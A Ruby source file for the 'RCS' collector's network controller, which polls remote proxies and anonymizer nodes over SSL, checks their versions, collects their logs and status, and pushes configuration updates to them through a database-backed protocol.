#
#  Network Controller to update the status of the components in the RCS network
#

# relatives
require_relative 'nc_protocol.rb'

# from RCS::Common
require 'rcs-common/trace'

# system
require 'socket'
require 'openssl'
require 'timeout'

module RCS
module Collector

class NetworkController
  extend RCS::Tracer

  # the minimum requested version of a component in order to work
  MIN_VERSION = 2011033101
  
  def self.check

    # retrieve the lists from the db
    elements = DB.proxies
    elements += DB.collectors

    # use one thread for each element
    threads = []

    # keep only the remote anonymizers discarding the local collectors
    elements.delete_if {|x| x['type'] == 'LOCAL'}

    # keep only the elements to be polled
    elements.delete_if {|x| x['poll'] == 0}

    if not elements.empty? then
      trace :info, "[NC] Handling #{elements.length} network elements..."
      # send the status to the db
      send_status "Handling #{elements.length} network elements..."
    else
      # send the status to the db
      send_status "Idle..."
    end

    # contact every element
    elements.each do |p|
      threads << Thread.new {
        status = []
        logs = []
        begin
          # three quarters of the interval check is a good compromise for timeout
          # we are sure that the operations will be finished before the next check
          Timeout::timeout(Config.global['NC_INTERVAL'] * 0.75) do
            status, logs = check_element p
          end
        rescue Exception => e
          trace :debug, "[NC] #{p['address']} #{e.message}"
          #trace :debug, "EXCEPTION: [#{e.class}] " << e.backtrace.join("\n")
          # report the failing reason
          report_status(p, 'KO', e.message)
        end

        # send the status to db
        report_status(p, *status) unless status.nil? or status.empty?

        trace :debug, "[NC] #{p['address']} Inserting logs..." unless logs.empty?

        # send the logs to db
        logs.each do |log|
          DB.proxy_add_log(p['proxy_id'], *log) unless p['proxy_id'].nil?
          DB.collector_add_log(p['collector_id'], *log) unless p['collector_id'].nil?
        end
        
        # make sure to destroy the thread after the check
        Thread.exit
      }
    end

    # wait for all the threads to finish
    threads.each do |t|
      t.join
    end

    trace :info, "[NC] Network elements check completed"
  end


  def self.check_element(element)

    # socket for the communication
    socket = TCPSocket.new(element['address'], element['port'])

    # ssl encryption stuff
    ssl_context = OpenSSL::SSL::SSLContext.new()
    ssl_context.cert = OpenSSL::X509::Certificate.new(File.read(Config.file('DB_CERT')))
    #ssl_context.key = OpenSSL::PKey::RSA.new(File.open("keys/MyCompanyClient.key"))
    ssl_socket = OpenSSL::SSL::SSLSocket.new(socket, ssl_context)
    ssl_socket.sync_close = true

    # connection
    # the exceptions will be caught from the caller
    ssl_socket.connect

    # create a new NC protocol
    proto = NCProto.new(ssl_socket)

    # authenticate with the component
    raise 'Cannot authenticate' unless proto.login(DB.network_signature)

    result = []
    logs = []
    begin
      # get a command from the component
      command = proto.get_command
      # parse the commands
      case command
        when NCProto::PROTO_VERSION
          ver = proto.version
          trace :info, "[NC] #{element['address']} is version #{ver}"

          # update the db accordingly
          DB.update_proxy_version(element['proxy_id'], ver) unless element['proxy_id'].nil?
          DB.update_collector_version(element['collector_id'], ver) unless element['collector_id'].nil?

          # version check for incompatibility
          raise "Version too old, please update the component." if ver.to_i < MIN_VERSION

        when NCProto::PROTO_MONITOR
          result = proto.monitor

        when NCProto::PROTO_CONF
          content = nil
          if element['status'] == NCProto::COMPONENT_NEED_CONFIG then
            content = DB.proxy_config(element['proxy_id']) unless element['proxy_id'].nil?
            content = DB.collector_config(element['collector_id']) unless element['collector_id'].nil?
            trace :info, "[NC] #{element['address']} has a new configuration (#{content.length} bytes)"
          end
          proto.config(content)

        when NCProto::PROTO_LOG
          time, type, desc = proto.log
          # we have to be fast here, we cannot insert them directly in the db
          # since it will take too much time and we have to finishe before the timeout
          # return the array and let the caller insert them
          logs << [time, type, desc]

        when NCProto::PROTO_BYE
          break
      end

    end until command.nil?

    # close the connection
    ssl_socket.close

    return result, logs
  end

  # this method can be executed only by the DB
  # and it is used to push a config to a network element without
  # having to wait for the next heartbeat
  def self.push(host, content)
    # retrieve the lists from the db
    elements = DB.proxies
    elements += DB.collectors

    # keep only the selected host
    elements.delete_if {|x| x['address'] != host}
    element = elements.first

    trace :info, "[NC] PUSHING to #{element['address']}"

    begin
      # contact the element
      status = check_element element
      # send the results to db
      report_status(element, *status) unless status.nil? or status.empty?
    rescue Exception => e
      return e.message, "text/html"
    end

    return "OK", "text/html"
  end


  def self.report_status(elem, status, message, disk=0, cpu=0, pcpu=0)
    if not elem['proxy_id'].nil? then
      component = "RCS::IPA::" + elem['proxy']
    end
    if not elem['collector_id'].nil? then
      component = "RCS::ANON::" + elem['collector']
    end

    trace :info, "[NC] [#{component}] #{elem['address']} #{status}"

    # create the stats hash
    stats = {:disk => disk, :cpu => cpu, :pcpu => pcpu}

    # send the status to the db
    DB.update_status component, elem['address'], status, message, stats
  end

  
  def self.send_status(message)
    # report our status to the db
    component = "RCS::NetworkController"
    ip = ''

    # report our status
    status = Status.my_status
    disk = Status.disk_free
    cpu = Status.cpu_load
    pcpu = Status.my_cpu_load

    # create the stats hash
    stats = {:disk => disk, :cpu => cpu, :pcpu => pcpu}

    # send the status to the db
    DB.update_status component, ip, status, message, stats
  end

end

end #Collector::
end #RCS::